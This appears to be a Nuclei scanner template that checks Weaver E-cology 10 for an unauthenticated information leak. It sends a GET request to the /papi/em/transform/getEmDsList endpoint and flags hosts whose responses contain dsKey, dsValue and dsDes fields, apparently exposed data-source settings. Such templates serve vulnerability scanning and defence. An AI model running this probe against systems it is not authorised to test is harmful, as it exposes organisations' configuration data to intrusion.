id: weaverE-cology-getEmDsList-info

info:
  name: 泛微E-cology10 getEmDsList 信息泄露漏洞
  author: weaverE
  severity: high
  tags: weaverE

http:
  - raw:
      - |+
        GET /papi/em/transform/getEmDsList HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"dsKey"'
          - '"dsValue"'
          - '"dsDes"'
        condition: and
